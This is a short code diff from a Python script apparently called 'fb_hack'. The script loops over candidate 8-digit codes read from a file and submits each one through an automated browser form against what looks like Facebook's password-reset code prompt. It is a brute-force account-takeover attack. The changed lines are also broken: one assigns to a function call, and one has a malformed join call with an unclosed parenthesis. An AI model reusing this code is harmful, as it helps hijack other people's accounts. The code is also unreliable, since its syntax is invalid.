@@ -124,7 +124,7 @@ def fb_hack(email, codex):
     f = open("8digits.txt", "r")
     while check2 =="Please check your email for a message with your code. Your code is 8 numbers long.":
       browser.select_form(nr=0)
-      y = f.readlines(attempt)
+      str(y) = f.readlines(attempt)
       attempt += 1
       try:
         browser.select_form(nr=0)
@@ -134,10 +134,10 @@ def fb_hack(email, codex):
         form = forms[0]
         print(form)
         browser.submit()
-        fail = (y, "failed")
-        success = (y, "succeded")
+        fail = (str(y), "failed")
+        success = (str(y), "succeded")
         s = " "
-        print(str(y), end='\r')
+        print(s.join(fail, end='\r')
         reset1 = attempt
         sleepy(30)
       except:
